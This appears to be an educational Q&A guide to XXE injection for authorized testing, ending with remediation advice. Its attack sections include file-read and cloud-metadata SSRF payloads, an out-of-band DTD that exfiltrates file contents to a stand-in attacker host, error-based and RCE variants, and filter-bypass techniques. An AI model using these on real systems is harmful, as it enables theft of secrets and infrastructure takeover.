# XXE — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **XML External Entity (XXE)** injection — from "what is a DTD" to
> in-band file read, SSRF→cloud-creds, blind OOB exfiltration, error-based, XInclude, file-upload XXE (SVG/OOXML), RCE,
> per-parser behavior, WAF bypasses, and defense. Q&A format, progressive difficulty, impact-first.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, own labs. Read a **benign** file first,
> bound your reads, run **no** entity-expansion DoS on production, delete uploaded artifacts, and tear down your OOB
> listener. XXE reaches secrets and internal networks fast — prove the capability, not the maximum damage.

**Canonical references** (cited throughout — read them):
- **PortSwigger Web Security Academy — XXE injection** (topic + 9 labs)
- **HackTricks — XXE**, **PayloadsAllTheThings — XXE Injection**, **PentesterLab — XML Attacks / XXE**
- **OWASP** — WSTG "Testing for XML Injection", **XXE Prevention Cheat Sheet**
- **CWE-611** (XML External Entity), CWE-776 (entity expansion / billion laughs), CWE-918 (SSRF chain)
- Companion kit: `Web/XXE/` (guide + arsenal + checklist + report template + `poc/`) and `../SSRF/`, `../FileUpload/`, `../LFI/`.

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q10)
- **Level 1 — Finding & detecting sinks** (Q11–Q20)
- **Level 2 — In-band file read** (Q21–Q30)
- **Level 3 — SSRF via XXE** (Q31–Q38)
- **Level 4 — Blind / OOB exfiltration** (Q39–Q50)
- **Level 5 — Error-based & local-DTD reuse** (Q51–Q58)
- **Level 6 — XInclude & content-type switching** (Q59–Q66)
- **Level 7 — File-upload XXE (SVG / OOXML / more)** (Q67–Q76)
- **Level 8 — Escalation & per-parser behavior** (Q77–Q86)
- **Level 9 — WAF bypass & tooling** (Q87–Q93)
- **Level 10 — Severity, false positives & defense** (Q94–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is XXE in one sentence?
A vulnerability where an application **parses attacker-controlled XML** with a parser that **resolves external
entities**, letting you make the server read local files, send server-side requests (SSRF), exfiltrate data
out-of-band, and sometimes achieve RCE. It's **CWE-611**.

### Q2. What is a DTD and an entity?
A **DTD** (Document Type Definition) declares a document's structure inside a `<!DOCTYPE …>`. An **entity** is a named
placeholder: `<!ENTITY name "value">` and `&name;` inserts the value. An **external** entity pulls its value from a URI:
`<!ENTITY xxe SYSTEM "file:///etc/passwd">` — and *that* dereference is the vulnerability.

### Q3. Internal vs external vs parameter entities?
- **Internal general:** `<!ENTITY x "abc">` → `&x;`. (Safe; used for detection.)
- **External general:** `<!ENTITY x SYSTEM "file://…">` → `&x;` pulls a file/URL. (The core XXE.)
- **Parameter:** `<!ENTITY % p "…">` → `%p;`, usable **only inside the DTD**. Essential for **blind/OOB** and error-based
  tricks (you build entities dynamically inside an external DTD).

### Q4. Why is XXE High–Critical?
Because the payoffs are direct and severe: **arbitrary file read** (source code + DB/cloud **secrets**), **SSRF** to the
internal network and **cloud-metadata → IAM credentials** (account/infra takeover), **blind OOB** exfiltration, and
occasionally **RCE**. Source+secrets or cloud creds is frequently a full compromise from one crafted document.

### Q5. What's the single most important payload to memorize?
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
If `&xxe;`'s value is reflected → in-band file read. Everything else is a variation on getting the dereference to happen and getting the data back.

### Q6. What are the four observability classes?
- **In-band:** the entity value is **reflected** in the response → read files directly (Q21).
- **Blind / OOB:** nothing reflected, but the parser makes **outbound** requests → exfil via an external DTD (Q39).
- **Error-based:** no OOB, but the parser **echoes errors** → force file contents into an error (Q51).
- **Fully blind:** nothing at all → confirm via **OOB DNS**, try XInclude/uploads.

### Q7. Where does XXE most commonly live?
Anywhere XML is parsed: **SOAP/XML APIs**, **file uploads that are XML** (SVG, DOCX/XLSX/PPTX, PDF, RSS, SAML metadata),
**SAML/SSO**, XML-RPC, sitemap/RSS import, SVG→PNG converters, config/invoice import, and **JSON endpoints that also
accept XML** (content-type switch, Q59).

### Q8. Is XXE still relevant, or old?
Very relevant. Parsers keep shipping **insecure defaults**, and **new formats keep being XML-backed** (Office, SVG,
SAML, GPX/KML, e-invoicing). It's a recurring source of CVEs and high-payout bounties (uploads and SAML especially).

### Q9. What's the mindset difference from injection like SQLi?
XXE isn't about breaking out of a value with metacharacters — it's about **controlling the document type / DTD** so the
parser fetches something for you. Your levers are **entities, parameter entities, protocol handlers, and where the data
comes back** (reflected / OOB / error).

### Q10. What's the #1 PoC-discipline rule?
**Read a benign file first** (`/etc/hostname`), prove the primitive, then read the **minimum** sensitive data needed to
show impact — redact it. Don't exfil the whole filesystem, don't hoard real keys, don't DoS. Capability, not carnage.

---

# LEVEL 1 — FINDING & DETECTING SINKS

### Q11. How do I find XML sinks?
Look for `Content-Type: application/xml`/`text/xml`/`application/soap+xml`, SOAP/WSDL endpoints, XML-RPC
(`/xmlrpc.php`), **file uploads** (SVG/DOCX/XLSX/PPTX/PDF/RSS/KML/plist/SAML), SVG→image converters, RSS/sitemap import,
and SAML/SSO. Grep client/source for XML parser calls. Also test JSON endpoints with an XML body (Q59).

### Q12. How do I detect that my XML is even parsed?
Send valid XML, then break it (unclosed tag). A **parse error** (or different behavior) vs a clean response tells you
the input is being XML-parsed — the precondition for XXE.

### Q13. What's the safe first XXE test?
An **internal** entity (no external fetch):
```xml
<!DOCTYPE r [ <!ENTITY t "x8bit-marker"> ]><r>&t;</r>
```
If `x8bit-marker` is reflected → entities expand and are reflected → in-band. If parsed but not reflected → blind. If
the DOCTYPE errors → hardened or DOCTYPE-filtered (→ XInclude).

### Q14. Why not jump straight to `file:///etc/passwd`?
Because you don't yet know the observability class or whether external fetch is allowed. The internal-entity test is
**benign** and tells you whether to go in-band, blind, or error-based — so you fire the right real payload once.

### Q15. The internal entity reflected — is that the finding?
**No (Q94).** Reflecting an *internal* entity proves the parser expands entities, but **not** that it fetches
**external** resources. It's a strong lead. The finding is a real **file's contents** (or an OOB callback). Escalate to
a `SYSTEM` external entity next.

### Q16. How do I tell in-band from blind quickly?
After the internal-entity test: reflected value = **in-band**; parsed-but-not-reflected = **blind** (go OOB). Then a
single external-entity test (benign file or your OOB host) confirms whether external fetch works.

### Q17. What XML-parser error signatures should I watch for?
`failed to load external entity`, `DOCTYPE is not allowed`, `SAXParseException`, `xmlParseEntityRef`, `lxml.etree`,
`undefined entity`, `premature end of data`, `org.xml.sax…`. They confirm the parser reached your input and hint at
the stack — and they enable **error-based** exfil (Q51).

### Q18. How do I fingerprint the parser/stack?
From error text/stack traces, `Server`/framework headers, file paths in errors (`/var/www` vs `C:\inetpub` vs Java
paths), and which protocol handlers work (`php://` → PHP; `jar:`/`netdoc:`/FTP-OOB → Java). The stack decides which
escalation (`php://filter`, `expect://`, `jar:`) is available (Q77).

### Q19. Can XXE exist even if the response never shows my data?
Yes — that's **blind** XXE, the common real-world case. You confirm and exploit it via **out-of-band** callbacks (Q39)
or **error-based** leakage (Q51). Absence of reflection is not absence of XXE.

### Q20. What's the deliverable of the detection phase?
A classification: **is XML parsed? do entities expand? are they reflected? does external fetch work? are errors shown?**
That tells you exactly which of §3/§8/§9/§10 path to take, so you don't waste shots.

---

# LEVEL 2 — IN-BAND FILE READ

### Q21. How does in-band file read work?
Declare an external entity pointing at a file and reference it in a node the app **reflects**:
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><r>&xxe;</r>
```
Put `&xxe;` where the response echoes a value (e.g. `<username>&xxe;</username>` if the app returns "user not found: …").

### Q22. Which files should I read (Linux)?
Benign first: `/etc/hostname`. Then high-value: `/etc/passwd` (users), `/proc/self/environ` (env/secrets),
`/proc/self/cwd/…`, app config (`.env`, `config.php`, `database.yml`, `wp-config.php`), `/root/.ssh/id_rsa`, cloud
creds files. Read the **minimum** to prove impact.

### Q23. Which files on Windows?
`file:///c:/windows/win.ini` (benign proof), `file:///c:/inetpub/wwwroot/web.config` (IIS app config + connection
strings), `file:///c:/windows/system32/drivers/etc/hosts`, app config under the web root.

### Q24. Why does reading source code or some files fail with `file://`?
Because files containing XML metacharacters (`<`, `&`, `]]>`) **break the XML parse** when injected as an entity value.
`/etc/passwd` (no such chars) is fine; PHP/HTML/config with `<`/`&` throws. Fix: **`php://filter` base64** (Q25) or CDATA-wrapping.

### Q25. How do I read source code cleanly?
On PHP, base64-encode it through the filter wrapper so it contains no XML-breaking chars:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```
Decode the base64 from the response → raw source (→ DB creds, keys, more bugs). This is the standard "read source" move.

### Q26. What is CDATA wrapping and when do I use it?
Wrapping the file content in `<![CDATA[ … ]]>` so `<`/`&` are treated as literal text. You build it with parameter
entities in an external DTD (start-CDATA entity + the file + end-CDATA). Useful when `php://filter` isn't available
(non-PHP) and you need to read a file with metacharacters in-band/OOB.

### Q27. Can I read directories?
Some parsers/handlers list directory contents for a `file://` dir URI (e.g. certain Java/PHP setups) — try
`file:///etc/` or `file:///var/www/`. Inconsistent, but a directory listing helps you find the exact config path to read.

### Q28. The value is reflected but truncated — why?
The app may reflect only part of the field, or the file has a newline/`<`/`&` that ends the parse early. Try a
single-line file, `php://filter` base64 (one long line), or OOB exfil (which isn't bound by the reflection field size).

### Q29. How do I prove in-band read safely for a report?
Show `/etc/hostname` (benign) reflected first, then one **redacted** line of a real secret file (e.g. `DB_PASSWORD=…`
with the value masked) to prove sensitivity. You don't need to dump the whole file — one proof line + the benign read is enough.

### Q30. In-band read of `/etc/passwd` — what severity?
On its own, **Medium–High** (it's a real file read primitive). It becomes **High–Critical** when you use the same
primitive to read **secrets/source/creds** (Q25) — always escalate from the benign proof to the impactful file.

---

# LEVEL 3 — SSRF VIA XXE

### Q31. How do I turn XXE into SSRF?
Point the entity at a URL instead of a file — the parser fetches it **server-side**:
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><r>&xxe;</r>
```
In-band shows the response; blind confirms via timing/OOB.

### Q32. What's the highest-impact SSRF target?
**Cloud metadata:** AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → **temporary IAM
credentials** → account/infra takeover. That's the Critical outcome. Also internal admin panels and unexposed services.

### Q33. Why might cloud-metadata XXE-SSRF fail?
- **IMDSv2** (AWS) requires a `PUT` + token header you usually **can't set via XXE** (XXE does a plain GET) → you may
  only reach IMDSv1-style paths or need a different SSRF primitive. GCP/Azure metadata require **custom headers**
  (`Metadata-Flavor`/`Metadata:true`) XXE can't add. Note the limitation; the SSRF kit covers header-capable primitives.

### Q34. How do I do internal port/host scanning with XXE?
Point the entity at `http://127.0.0.1:PORT/` and diff responses/timing across ports/hosts. In-band gives you the
service banner/response; blind gives timing. Enumerate internal services to find the next target.

### Q35. In-band SSRF vs blind SSRF via XXE?
In-band: the fetched URL's **response body** comes back to you (great — you read internal responses). Blind: no body,
but the request still happens — confirm via OOB (your server sees the hit) or timing. Prefer in-band when available.

### Q36. Where does the full SSRF technique live?
`../SSRF/` — IP-encoding bypasses, IMDSv2, redirect-to-internal, DNS rebinding, gopher→RCE. XXE is the **delivery**;
that kit is the **escalation**. Chain them.

### Q37. Can XXE-SSRF hit non-HTTP internal services?
Limited by the parser's protocol handlers. `http://`/`ftp://` are common; `gopher://` (for Redis/etc. RCE) is rarely
supported by XML parsers, so gopher-based SSRF usually needs a different primitive. Test what the parser allows.

### Q38. What severity is XXE→SSRF?
`→ cloud IAM creds` = **Critical**; `→ internal service access` (no creds yet) = **High–Medium**; `fetched my URL only`
= scope it (SSRF-only is a finding but weaker than file read/creds). Always push toward metadata/creds/internal-admin.

---

# LEVEL 4 — BLIND / OOB EXFILTRATION

### Q39. What is blind/OOB XXE and why is it the workhorse?
When nothing is reflected but the parser can make **outbound** requests, you use an **external DTD** on your server plus
**parameter entities** to read a file and send it to you inside a URL. It's the standard technique for the common
"nothing comes back" real-world case.

### Q40. Walk me through the OOB flow.
1. Target submits: `<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOU/evil.dtd"> %ext; ]><r>t</r>`.
2. Target fetches your `evil.dtd`, which declares `%file` (reads `/etc/hostname`) and `%eval` (builds an `%exfil` entity
   whose URL contains `%file`).
3. `%exfil;` makes the target request `http://YOU/log?x=<file-contents>` → the file lands in **your access log**.

### Q41. Why parameter entities (`%`) and not general (`&`)?
Because you must declare an entity **inside another entity's definition in the DTD** — only **parameter** entities work
there, and they're often allowed in the **external** subset even when general entities in the internal subset are
restricted. Parameter entities are the enabling trick for OOB and error-based.

### Q42. What's the `&#x25;` in the DTD?
It's the numeric char reference for **`%`**. You need a literal `%` to *declare* a parameter entity inside another
entity's string, but a bare `%` there would be parsed immediately — so you escape it as `&#x25;` to defer it.

### Q43. What do I use to catch the OOB callback?
**Burp Collaborator**, **Interactsh** (`interactsh-client`), or this kit's **`poc/oob_server.py`** (serves `evil.dtd`,
logs the exfil, auto-decodes base64). Any HTTP server whose logs you can read works — the file arrives in the query string.

### Q44. How do I OOB-exfiltrate a multi-line file (like /etc/passwd)?
Multi-line/`<`/`&` content breaks the entity URL. **Base64-encode** it (PHP: `php://filter` in `%file`) so it's a single
URL-safe line, then decode from your log. For non-PHP, exfil line-by-line or read single-line files.

### Q45. HTTP egress is blocked — can I still do OOB?
Sometimes: **FTP** OOB (`ftp://YOU:2121/%file;`) works on **Java** parsers when HTTP is filtered; or **DNS-only** —
put a unique subdomain in the URL and a DNS lookup (Interactsh) confirms blind XXE even without HTTP/data egress. If all
egress is dead → go **error-based** (Q51).

### Q46. How do I confirm blind XXE if I can't exfil data at all?
An **OOB DNS or HTTP hit** to your unique host proves the parser fetched your resource = blind XXE confirmed (report as
blind). Then try to escalate to actual file read via error-based/local-DTD. A DNS-only hit is a valid (if lower) finding.

### Q47. Why does my external DTD not load?
Possible causes: no outbound network (→ error-based), the parser disabled **parameter-entity** or external-DTD loading,
a WAF blocked the DOCTYPE (→ XInclude/UTF-16), or wrong URL. Confirm egress with a plain OOB entity first, then add the exfil logic.

### Q48. Can I exfil environment variables / secrets blindly?
Yes — read `file:///proc/self/environ` (Linux) into `%file` and exfil it (base64). Env often holds DB creds, API keys,
cloud tokens. Same for app config files. Bound it and redact in the report.

### Q49. Is the OOB access-log line enough proof?
Yes — a log line `GET /log?x=<hostname-or-base64> from <target-egress-IP>` is strong evidence of blind file read.
Include it (with the target egress IP) plus the exact target payload and your `evil.dtd` in the report.

### Q50. What's the safe way to run the OOB server?
On a host you control, **only during testing**, reading a **benign** file first; then **tear it down**. Don't leave a
public exfil endpoint running (others' scanners could hit it), and don't log real secrets you don't need.

---

# LEVEL 5 — ERROR-BASED & LOCAL-DTD REUSE

### Q51. What is error-based XXE?
When outbound egress is blocked but the parser **shows errors**, you make it try to open a **nonexistent path that
contains the file's contents**, so the "failed to open file:///nonexistent/<CONTENTS>" error **leaks the file** in the
response. No attacker server data-channel needed for egress — just verbose errors.

### Q52. Show the error-based DTD.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
The parser expands `%file`, builds `%err` pointing at a bogus path with the contents embedded, fails to open it, and prints the path (with contents) in the error.

### Q53. Error-based still needs my external DTD — unless?
Unless you use a **local DTD** already on the box (Q54) to host the malicious parameter-entity logic — then you need **no
outbound at all**. Pure error-based + local DTD = XXE file read with zero egress.

### Q54. What is local-DTD reuse?
Many systems ship DTD files (e.g. GNOME `/usr/share/yelp/dtd/docbookx.dtd`, distro/Java DTDs). You load a local DTD and
**redefine one of its parameter entities** to inject your error-based exfil logic. Because it's a local `file://`
reference, no network egress is required.

### Q55. How do I find a usable local DTD?
Known-common ones (yelp `docbookx.dtd`, various distro/JDK DTDs). Enumerate by trying to load candidates and watching
for parse behavior; PayloadsAllTheThings/HackTricks list frequently-present DTDs and which parameter entity to override.

### Q56. When is error-based better than OOB?
When the target **can't reach your server** (egress-filtered/air-gapped) but **displays stack traces/errors**.
OOB needs outbound; error-based needs verbose errors. Pick by what the environment allows — many hardened internal apps are egress-blocked but error-verbose.

### Q57. What if errors are shown but truncated?
The error may cut off long content. Read **shorter/targeted** files, extract in chunks (substring via more DTD logic),
or combine with any partial OOB. Even a truncated secret line can prove impact.

### Q58. Is a leaked file path in an error (no contents) a finding?
That's info-disclosure, weaker than content leak. Push to get **file contents** into the error (Q52). A path-only leak
is low; contents = the real XXE file-read finding.

---

# LEVEL 6 — XINCLUDE & CONTENT-TYPE SWITCHING

### Q59. What is content-type switching?
Sending an XML body to an endpoint that **normally takes JSON** — some frameworks pick the parser by `Content-Type`, so
flipping `application/json` → `application/xml` (or `text/xml`) makes them parse your XML → XXE. A classic win on
"JSON-only" APIs (also in `../../API/REST/`).

### Q60. When do I need XInclude instead of a DOCTYPE?
When you **don't control the whole document** — the app wraps your input inside its own XML, so you can't add a
`<!DOCTYPE>` at the top; you only own a sub-node. **XInclude** pulls a file into that node without any DOCTYPE.

### Q61. Show an XInclude payload.
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Inject just the element the server embeds. `parse="text"` reads raw text; use `php://filter` in `href` for source.

### Q62. Why does XInclude beat "DOCTYPE is filtered" defenses?
Because XInclude is an **element**, not a DOCTYPE — WAFs/parsers that block/reject `<!DOCTYPE>`/`<!ENTITY>` often still
process `<xi:include>`. It sidesteps the most common XXE filter entirely.

### Q63. Can XInclude do SSRF and base64 source?
Yes: `href="http://169.254.169.254/…"` (SSRF) and `href="php://filter/convert.base64-encode/resource=…"` (source).
XInclude is a full alternative delivery for file-read and SSRF when DOCTYPE is off the table.

### Q64. What's a limitation of XInclude?
It requires the server to process XInclude directives (not all parsers do by default), and you must land your element
where it's actually parsed as XML. When it works, it's powerful; when it doesn't, fall back to content-type switch or uploads.

### Q65. Does content-type switching work for SOAP/other formats too?
The idea generalizes: if the backend parses the body per declared type, any type it maps to an **entity-resolving XML
parser** (`application/xml`, `text/xml`, `application/*+xml`, SOAP) is a candidate. Try each.

### Q66. How do I combine content-type switch with blind OOB?
Send the XML (with the OOB DOCTYPE/parameter-entity payload) to the JSON endpoint under `application/xml`, and watch
your OOB listener. Same OOB mechanics (Q40), just delivered via the content-type trick.

---

# LEVEL 7 — FILE-UPLOAD XXE

### Q67. Why are file uploads a top XXE surface?
Because the app **parses the uploaded file server-side** (thumbnailing, text extraction, conversion, preview) — and
many upload formats are **XML under the hood** (SVG, DOCX/XLSX/PPTX, PDF, RSS, SAML, KML). The parse happens without
the user even seeing raw XML.

### Q68. How do I XXE an SVG upload?
SVG is XML — add a DOCTYPE:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
```
Upload as an avatar/logo/image; then **view the rendered/converted image or its text** to read the file. `poc/make_svg_xxe.py` builds it.

### Q69. How do OOXML (DOCX/XLSX/PPTX) XXE work?
Office files are **ZIP archives of XML**. Unzip, inject a DOCTYPE/parameter-entity into a parsed part (`word/
document.xml`, `[Content_Types].xml`, `xl/workbook.xml`, `ppt/presentation.xml`), re-zip, and upload to a
resume/import/preview feature. Blind-OOB is reliable here. `poc/make_ooxml_xxe.py` automates it.

### Q70. Which OOXML part should I inject into?
The one the server actually parses — usually `word/document.xml` (DOCX), `xl/workbook.xml`/`xl/sharedStrings.xml`
(XLSX), `ppt/presentation.xml` (PPTX), or `[Content_Types].xml` (parsed by everything). If unsure, inject the OOB
payload into several and see which fires.

### Q71. In-band vs blind for uploads?
In-band works if the app **renders/echoes** the parsed content (SVG text shown, doc preview). Often uploads are blind
(the file is processed silently) → use **OOB** (external DTD). OOB is the default assumption for document uploads.

### Q72. What other upload formats are XML-backed?
**PDF** (some parsers), **RSS/Atom** feed import, **GPX/KML** (map/route upload), **plist** (Apple), **SAML metadata**,
**SVG** in many contexts, e-invoice **UBL/XML**, **DMARC/XML reports**. Any "upload → server parses" of these is a candidate.

### Q73. The SVG uploaded but I see nothing — now what?
Try: the **converted** output (SVG→PNG thumbnail may embed the text), a blind **OOB** SVG, a different node placement,
or switch to **OOXML** (often parsed more eagerly). Silent processing ≠ safe; go OOB.

### Q74. How do I stay safe with upload XXE?
Use **your own account**, benign file/OOB first, mark files clearly as tests, and **delete the uploaded artifact** after
(so it doesn't linger in others' feeds/exports). Don't upload payloads that read/exfil real secrets beyond proof.

### Q75. Do SVG sanitizers stop XXE?
A good sanitizer strips DOCTYPE/entities → blocks it. But many apps sanitize for **script** (XSS) yet still **parse**
the SVG with an entity-resolving parser first (or convert it), leaving XXE open. Test even if "SVG is sanitized."

### Q76. Where do the SVG/OOXML payloads also live?
`../FileUpload/` has SVG/XXE and OOXML payloads in its upload context; this kit's `poc/make_svg_xxe.py` /
`make_ooxml_xxe.py` build them. Cross-reference — upload XXE sits at the intersection of the two kits.

---

# LEVEL 8 — ESCALATION & PER-PARSER BEHAVIOR

### Q77. Which parsers are XXE-prone by default?
Historically **Java** (`DocumentBuilder`/SAX, old defaults), **.NET** (`XmlDocument`/`XmlResolver` ≤4.5.1), **PHP
libxml** (when entity loading is enabled / older versions), older **Python** `xml.sax`/`etree`. **Go** `encoding/xml`
does **not** resolve external entities (usually safe). Recent **libxml/lxml** default safer but apps re-enable it.

### Q78. What can I do on PHP specifically?
`php://filter/convert.base64-encode/resource=…` → read **source** (any file with metacharacters) cleanly; `expect://id`
→ **RCE** if the `expect` extension is loaded; `php://filter` chains for other transforms. PHP is the richest XXE
escalation target.

### Q79. What's special about Java parsers?
Support for `jar:`, `netdoc:`, and **FTP** — so **FTP-OOB** works when HTTP is filtered, and `jar:http://…!/` can
fetch+extract archives (a path toward write/RCE in some flows). No `php://`, but the extra protocols make Java flexible for OOB.

### Q80. How does XXE reach RCE?
- **PHP `expect://`** → direct command exec.
- **`jar:` (Java)** → fetch+extract → in some setups a write/RCE primitive.
- **Upload chains** → XXE that writes a file / combines with another bug.
- Occasionally parser/library CVEs. RCE is the top of the XXE tree — prove with a benign command and stop.

### Q81. How do I escalate a bare file-read to Critical?
Read **source** (`php://filter`) → get **DB/cloud creds/secret keys** → use them (prove, then stop). Or SSRF →
**metadata → IAM creds**. The jump from "read /etc/passwd" to "read config with live credentials" is what turns
Medium/High into Critical.

### Q82. Can XXE read the app's own secrets/keys?
Yes — that's the point. `.env`, `config.php`, `web.config`, `application.properties`, `settings.py`,
`/proc/self/environ`, cloud creds files. Those contain the DB passwords, API keys, and signing secrets that unlock everything else.

### Q83. What's the escalation when only SSRF works (no file read)?
Chase **cloud metadata → credentials** (Critical) and **internal admin/services** via the SSRF kit. If metadata needs
headers XXE can't set, document the internal-service reach you *do* have and pivot with a header-capable SSRF primitive if one exists.

### Q84. How do I chain XXE with other bugs?
XXE-read a **JWT/HMAC signing secret** → forge tokens (`../JWT/`). XXE-read **source** → find new bugs / hardcoded
creds. XXE-SSRF → metadata → cloud pivot. XXE in **SAML** → auth-adjacent impact. Treat the file read/SSRF as a primitive that unlocks the next kit.

### Q85. Does the entity-expansion DoS (billion laughs) belong in a report?
Usually **not** — most programs forbid DoS and you shouldn't fire it on prod. If entity-expansion protection is genuinely
missing and it's in scope, note the **primitive** (parser accepts nested entities) without triggering an outage. It's CWE-776, typically Low–Medium.

### Q86. What's the difference between XXE and "XML injection"?
**XML injection** = injecting XML tags/structure into a document to alter its logic (e.g. add an `<admin>true</admin>`
node) — no external entities. **XXE** = abusing **external entities/DTDs** to read files/SSRF. Related (both need an XML
sink) but different mechanisms and impact.

---

# LEVEL 9 — WAF BYPASS & TOOLING

### Q87. `<!DOCTYPE>`/`<!ENTITY>` is filtered — how do I bypass?
Use **XInclude** (no DOCTYPE, Q60), the **content-type switch** (Q59), or **encode the body as UTF-16** (Q88) so a
byte-signature WAF misses `<!DOCTYPE` while the parser still reads it. Also try whitespace/newline variations and
splitting the DTD across parameter entities.

### Q88. How does UTF-16 (or UTF-7) encoding bypass a WAF?
The WAF matches the **UTF-8 bytes** of `<!DOCTYPE`/`<!ENTITY`; if you submit the same XML encoded as **UTF-16** (add a
BOM), those byte signatures don't match, but the XML parser detects the encoding and parses it normally. `iconv -t
UTF-16BE payload.xml` produces it.

### Q89. `SYSTEM` is blocked — alternative?
Use **`PUBLIC`**: `<!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd">`. `PUBLIC` external entities take a public-id
plus the same system URI and are often not covered by a `SYSTEM`-only filter.

### Q90. A protocol is blocked — how do I swap?
Cycle handlers by stack: `file://` ↔ `php://filter` ↔ `http://` ↔ `ftp://` ↔ `jar:` ↔ `netdoc:`. E.g. if `file://` is
filtered on PHP, `php://filter/...resource=` still reads files; on Java, `ftp://` gives OOB when `http://` is blocked.

### Q91. What tools help with XXE?
**Burp** (Repeater + **Collaborator** for OOB) is the mainstay; **Interactsh** for OOB HTTP/DNS/FTP; **XXEinjector**
(automates OOB/error read + brute); **oxml_xxe** (builds XXE Office/SVG files); and this kit's `poc/` (oob_server,
xxe_probe, make_ooxml/svg). Manual + Collaborator beats scanners for XXE.

### Q92. Can automated scanners find XXE reliably?
Partly — they catch in-band and some OOB (with a Collaborator-like server) but miss content-type switches, upload
vectors, XInclude, and parser-specific tricks. XXE rewards **manual** testing; use scanners for a first pass only.

### Q93. How do I keep current on XXE?
Follow parser-default CVEs (Java/Spring/.NET/PHP libraries), PortSwigger research + labs, PayloadsAllTheThings XXE
updates, and bounty disclosures (uploads/SAML/SOAP). The class is stable; the **new XML-backed formats** and **parser
defaults** are what change.

---

# LEVEL 10 — SEVERITY, FALSE POSITIVES & DEFENSE

### Q94. What are the most common XXE false positives?
- An **internal** entity (`&test;`) reflected (proves parsing, not external fetch).
- A parse **error** on `<!DOCTYPE` with no confirmed fetch/OOB.
- "It fetched my URL" (**SSRF-only**) with no metadata/creds/file shown.
- A blind **DNS-only** hit reported as full file read (it's blind confirm, not read).
- A billion-laughs "crash" on a scratch box (DoS, usually out of scope).

### Q95. How do triagers rate XXE?
```
File read of secrets/source (creds/keys) · SSRF→IAM creds · RCE     Critical–High
Blind OOB read of arbitrary local files                             High
SSRF to internal services (no creds)                                High–Medium
Read of a non-sensitive file only · blind DNS-only                  Medium
Entity-expansion DoS (if in scope)                                  Medium–Low
```

### Q96. What CVSS/CWE do I use?
**CWE-611** is the anchor; add **CWE-918** for the SSRF chain and **CWE-94** for RCE. Vector ≈
`AV:N/AC:L/PR:?/UI:?/S:?/C:H/I:?/A:?` — raise `S:C` when SSRF crosses into other systems, set `PR`/`UI` by how the XML is
reached (unauth upload is worst). Lead with the **data you actually retrieved**.

### Q97. How do I write remediation that's actually correct?
**Disable DTDs / external-entity resolution in the parser** — the real fix:
- **Java:** `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
- **.NET:** `XmlReaderSettings.DtdProcessing = Prohibit; XmlResolver = null`.
- **PHP libxml:** don't enable `LIBXML_NOENT`/external loading on untrusted input (PHP≥8 default-safe).
- **Python:** use **defusedxml**; disable network/entity resolution in lxml.
- **Ruby Nokogiri:** don't set `NOENT`/`DTDLOAD`. **Node:** avoid `noent:true`.

### Q98. Beyond disabling entities, what hardens against XXE?
Prefer **JSON** over XML where possible; **allow-list**/validate input; run the parser with **least privilege** and **no
outbound egress** (kills SSRF/OOB even if entities slip through); patch parser libraries; and **sanitize/strip DOCTYPE**
on uploaded XML/SVG/OOXML before parsing.

### Q99. If I can only fix one thing, what is it?
**Turn off DOCTYPE / external-entity processing in every XML parser that touches untrusted input** (`disallow-doctype-decl`
= true, or the language equivalent). That single setting neutralizes in-band, blind, error-based, and SSRF XXE at once.

### Q100. Give the defender's one-paragraph summary.
Treat every XML input as hostile: **disable DTDs and external-entity resolution** in every parser (`disallow-doctype-decl`,
`XmlResolver=null`, defusedxml, don't set NOENT/DTDLOAD) — that alone kills XXE. Then **defense-in-depth**: prefer JSON,
strip DOCTYPE from uploaded SVG/OOXML before parsing, validate/allow-list, run parsers with **least privilege and no
outbound network** (so even a missed setting can't reach files/metadata/your OOB server), and keep parser libraries
patched. Do that and the whole attack tree here — in-band read, `php://filter` source, SSRF→cloud-creds, blind OOB,
error-based, XInclude, upload XXE, RCE — collapses.

---

> **Final word:** XXE is "the app parses my XML" turned into **read the server's files, reach its internal network, steal
> its cloud credentials, sometimes run code.** Detect it with a benign internal entity, take the highest path available
> (in-band → `php://filter` source → SSRF→IAM creds → RCE), and when nothing reflects go **blind OOB** or **error-based**.
> Beat filters with XInclude / content-type / UTF-16 / PUBLIC / protocol-swap. Prove on a benign file, escalate to the
> secret, report CWE-611 impact-first — authorized targets only, minimum reads, clean up your OOB.
